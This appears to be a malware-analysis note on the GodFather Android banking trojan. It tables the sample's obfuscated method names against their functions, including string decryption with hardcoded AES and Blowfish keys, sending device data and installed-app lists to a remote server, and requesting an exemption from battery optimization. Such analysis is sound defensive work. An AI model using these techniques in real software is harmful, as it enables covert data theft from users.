|cirrofilum.effluvias  |  Decipher Strings
|Sandrakottos  |  Write data inside the SharedPreference
|bedamned  |  Retrive data from SharedPreference
|champaka  |  Generate random string
|undissuadably |  Use OkHttp to mke a request and then process the http response and save it in the sharepreference
|hagiography | Decode a string into Base64
|Uriiah | Deciphering with blowfish, SecretKeySpec “ABC”
|samariums  | Takes a string in b64 and decoding it with an algorithm
|hexammine  | Send data to a remote server
|rarefeatured  |  Prepares to send a request http
|gnarliness | Takes a string in input, converts it to a byte array using UTF-8 encoding and then econdes the byte array in Base64, return the string as result
|trochanteric  |  Converts an array of bytes into a hexadecimal string
|crakow | Ensure that the lenght of string “s” is a multiple of 16 by adding null characters to the end of the string if necessary
|Predicator | Function where an IV (sulphuric) is initialized using a fixed sequence of hexadecimal characters ("fedcba9876543210"). A secret key (potlatching) is created for the AES algorighm using a fix sequence of hexadecimal characters ("0123456789abcdef").
|Spellican  | Executes an Http Get request to a specified URL, parses the HTML response to find a specific metatag and then stores the contents of that tag in the Android SharedPreferences
|Malacostraca  |  Function that exectues ab Http Post request with certain parameters and URL, using methods to support for Recover values and build demand
|Abourezk  |  Function that checks whether the app has permission to ignore battery optimization and, if it does not, request that permission. Once permission is obtained, it opens a specific URL in the chrome browser
|JJ  | Function that determines a code based on the manufacturer and model of the Android device it is running on, and then uses the Sandrakottos method of the Tamarix class to send this code along with the "device" key
|speculated | Function that checks whether the device is locked. If it is not, it initiates a periodic action that checks a specific condition in the shared preferences and, if satisfied, cancels the timer and logs the event.  
|untraffickable | Function that primarily handles the display of a Web page in a WebView, with specific configurations based on values obtained from methods in other classes (Tamarix and cirrofilum).
|Osnabruck |  Function that returns a string containing the package names of the non-system applications installed on the Android device and writes this info to the sharedpreferences
|supersincerity | The function configures various parameters in the context of the application based on default values and the default language of the device.  
|Champaka  |  Creates a random string used for "ky" of sharedpreferences

## Shared Preference Unmask

The following is a version of app.xml with an explanation of the main fields and the functions that go into interacting with them. 

https://github.com/phemt91/GodFather_String/blob/main/Shared%20Preference%20Details


